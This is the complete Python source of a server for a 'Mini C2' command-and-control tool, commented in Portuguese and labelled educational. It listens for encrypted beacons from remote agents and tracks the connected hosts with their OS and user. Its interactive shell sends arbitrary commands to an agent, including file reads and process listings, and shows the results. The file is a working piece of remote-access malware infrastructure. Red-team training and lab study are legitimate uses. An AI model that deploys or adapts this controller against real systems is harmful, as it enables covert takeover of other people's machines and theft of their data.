#!/usr/bin/env python3
"""
server/server.py — Servidor C2 (Command & Control)
Gerencia conexões de agentes, envia comandos e exibe resultados.

Uso:
  python3 server/server.py
  python3 server/server.py --host 0.0.0.0 --port 4444 --password minha_senha

AVISO LEGAL: Apenas para uso em laboratório autorizado.
"""

import socket
import threading
import argparse
import json
import sys
import os
import time
from datetime import datetime

# Adiciona o diretório raiz ao path para importar shared
sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
from shared.crypto import derive_keys, encrypt, decrypt, encode_packet, recv_packet


# ─── Cores ────────────────────────────────────────────────────────────────────

CYAN   = "\033[96m"
GREEN  = "\033[92m"
YELLOW = "\033[93m"
RED    = "\033[91m"
BOLD   = "\033[1m"
DIM    = "\033[2m"
RESET  = "\033[0m"


# ─── Estado global ────────────────────────────────────────────────────────────

agents      = {}          # {agent_id: AgentSession}
agents_lock = threading.Lock()
agent_counter = 0


class AgentSession:
    """Representa um agente conectado."""

    def __init__(self, agent_id: int, sock: socket.socket, addr: tuple,
                 enc_key: bytes, mac_key: bytes):
        self.id       = agent_id
        self.sock     = sock
        self.addr     = addr
        self.enc_key  = enc_key
        self.mac_key  = mac_key
        self.info     = {}
        self.connected_at = datetime.utcnow().strftime("%Y-%m-%d %H:%M:%S")
        self.active   = True

    def send_command(self, cmd: str) -> str:
        """Envia comando e aguarda resposta."""
        payload = json.dumps({"type": "cmd", "data": cmd}).encode()
        packet  = encode_packet(encrypt(payload, self.enc_key, self.mac_key))
        self.sock.sendall(packet)
        raw      = recv_packet(self.sock)
        response = json.loads(decrypt(raw, self.enc_key, self.mac_key))
        return response.get("data", "")

    def close(self):
        self.active = False
        try:
            self.sock.close()
        except Exception:
            pass


# ─── Handler de agente ────────────────────────────────────────────────────────

def handle_agent(sock: socket.socket, addr: tuple,
                 enc_key: bytes, mac_key: bytes):
    """Thread que gerencia o handshake inicial de um novo agente."""
    global agent_counter
    try:
        # Aguarda o beacon de identificação do agente
        raw  = recv_packet(sock)
        data = json.loads(decrypt(raw, enc_key, mac_key))
        if data.get("type") != "beacon":
            sock.close()
            return

        with agents_lock:
            agent_counter += 1
            aid = agent_counter
            session = AgentSession(aid, sock, addr, enc_key, mac_key)
            session.info = data.get("info", {})
            agents[aid] = session

        print(f"\n  {GREEN}[+]{RESET} Novo agente conectado!"
              f"  ID={BOLD}{aid}{RESET}"
              f"  {addr[0]}:{addr[1]}"
              f"  OS={session.info.get('os', '?')}"
              f"  User={session.info.get('user', '?')}")
        print(f"  {DIM}Digite 'interact {aid}' para interagir{RESET}")
        print(f"\n{CYAN}c2>{RESET} ", end="", flush=True)

    except Exception as e:
        print(f"\n  {RED}[-]{RESET} Erro no handshake de {addr}: {e}")
        sock.close()


# ─── Listener ─────────────────────────────────────────────────────────────────

def start_listener(host: str, port: int, enc_key: bytes, mac_key: bytes):
    """Thread do listener TCP."""
    srv = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    srv.bind((host, port))
    srv.listen(10)
    print(f"  {GREEN}[*]{RESET} Listener ativo em {host}:{port}")

    while True:
        try:
            sock, addr = srv.accept()
            t = threading.Thread(
                target=handle_agent,
                args=(sock, addr, enc_key, mac_key),
                daemon=True,
            )
            t.start()
        except Exception:
            break


# ─── Shell interativo ─────────────────────────────────────────────────────────

def cmd_list():
    """Lista agentes conectados."""
    with agents_lock:
        active = {k: v for k, v in agents.items() if v.active}
    if not active:
        print(f"  {YELLOW}[!]{RESET} Nenhum agente conectado")
        return
    print(f"\n  {'ID':<5} {'IP':<18} {'OS':<12} {'Usuário':<16} {'Conectado em'}")
    print(f"  {'─'*5} {'─'*18} {'─'*12} {'─'*16} {'─'*20}")
    for aid, s in active.items():
        print(f"  {aid:<5} {s.addr[0]:<18} "
              f"{s.info.get('os','?')[:11]:<12} "
              f"{s.info.get('user','?')[:15]:<16} "
              f"{s.connected_at}")
    print()


def cmd_interact(agent_id: int):
    """Abre shell interativo com um agente."""
    with agents_lock:
        session = agents.get(agent_id)
    if not session or not session.active:
        print(f"  {RED}[-]{RESET} Agente {agent_id} não encontrado ou desconectado")
        return

    print(f"\n  {GREEN}[*]{RESET} Interagindo com agente {agent_id} "
          f"({session.addr[0]}) — digite 'background' para voltar\n")

    while True:
        try:
            cmd = input(f"  {CYAN}agente-{agent_id}>{RESET} ").strip()
        except (EOFError, KeyboardInterrupt):
            print()
            break

        if not cmd:
            continue
        if cmd.lower() in ("background", "bg", "exit", "quit"):
            break
        if cmd.lower() == "help":
            print(f"""
  Comandos disponíveis no agente:
    {YELLOW}sysinfo{RESET}       — informações do sistema
    {YELLOW}whoami{RESET}        — usuário atual
    {YELLOW}pwd{RESET}           — diretório atual
    {YELLOW}ls [path]{RESET}     — listar arquivos
    {YELLOW}cd <path>{RESET}     — mudar diretório
    {YELLOW}cat <file>{RESET}    — ler arquivo
    {YELLOW}ps{RESET}            — processos em execução
    {YELLOW}ifconfig{RESET}      — interfaces de rede
    {YELLOW}<qualquer cmd>{RESET} — executado no shell do agente
    {YELLOW}background{RESET}    — voltar ao menu principal
            """)
            continue

        try:
            result = session.send_command(cmd)
            if result:
                print(f"\n{DIM}{result}{RESET}\n")
            else:
                print(f"  {DIM}(sem saída){RESET}\n")
        except ConnectionError:
            print(f"\n  {RED}[-]{RESET} Agente desconectado")
            session.active = False
            break
        except Exception as e:
            print(f"\n  {RED}[-]{RESET} Erro: {e}\n")


def cmd_kill(agent_id: int):
    """Desconecta um agente."""
    with agents_lock:
        session = agents.get(agent_id)
    if not session:
        print(f"  {RED}[-]{RESET} Agente {agent_id} não encontrado")
        return
    try:
        session.send_command("exit")
    except Exception:
        pass
    session.close()
    print(f"  {YELLOW}[!]{RESET} Agente {agent_id} desconectado")


def print_help():
    print(f"""
  {BOLD}Comandos do servidor:{RESET}
    {YELLOW}list{RESET}              — listar agentes conectados
    {YELLOW}interact <id>{RESET}     — abrir shell com agente
    {YELLOW}kill <id>{RESET}         — desconectar agente
    {YELLOW}help{RESET}              — este menu
    {YELLOW}exit{RESET}              — encerrar servidor
    """)


def interactive_shell():
    """Loop principal do servidor C2."""
    print_help()
    while True:
        try:
            raw = input(f"{CYAN}c2>{RESET} ").strip()
        except (EOFError, KeyboardInterrupt):
            print(f"\n  {YELLOW}[!]{RESET} Encerrando servidor...")
            break

        if not raw:
            continue

        parts = raw.split()
        cmd   = parts[0].lower()

        if cmd == "list":
            cmd_list()
        elif cmd == "interact" and len(parts) == 2:
            try:
                cmd_interact(int(parts[1]))
            except ValueError:
                print(f"  {RED}[-]{RESET} ID inválido")
        elif cmd == "kill" and len(parts) == 2:
            try:
                cmd_kill(int(parts[1]))
            except ValueError:
                print(f"  {RED}[-]{RESET} ID inválido")
        elif cmd == "help":
            print_help()
        elif cmd in ("exit", "quit"):
            print(f"  {YELLOW}[!]{RESET} Encerrando...")
            break
        else:
            print(f"  {RED}[-]{RESET} Comando desconhecido. Digite 'help'")


# ─── Entry point ──────────────────────────────────────────────────────────────

def main():
    parser = argparse.ArgumentParser(
        prog="server.py",
        description="Mini C2 — Servidor de Comando e Controle (educacional)",
    )
    parser.add_argument("--host",     default="0.0.0.0",    help="IP de escuta (padrão: 0.0.0.0)")
    parser.add_argument("--port",     default=4444, type=int, help="Porta (padrão: 4444)")
    parser.add_argument("--password", default="c2-edu-2024", help="Senha compartilhada com o agente")
    args = parser.parse_args()

    print(f"""{CYAN}
  ███╗   ███╗██╗███╗  ██╗██╗      ██████╗██████╗
  ████╗ ████║██║████╗ ██║██║     ██╔════╝╚════██╗
  ██╔████╔██║██║██╔██╗██║██║     ██║      █████╔╝
  ██║╚██╔╝██║██║██║╚████║██║     ██║     ██╔═══╝
  ██║ ╚═╝ ██║██║██║ ╚███║██║     ╚██████╗███████╗
  ╚═╝     ╚═╝╚═╝╚═╝  ╚══╝╚═╝      ╚═════╝╚══════╝
  {DIM}Command & Control — Educacional{RESET}
    """)

    enc_key, mac_key = derive_keys(args.password)

    listener = threading.Thread(
        target=start_listener,
        args=(args.host, args.port, enc_key, mac_key),
        daemon=True,
    )
    listener.start()
    time.sleep(0.3)  # aguarda listener iniciar

    interactive_shell()


if __name__ == "__main__":
    main()
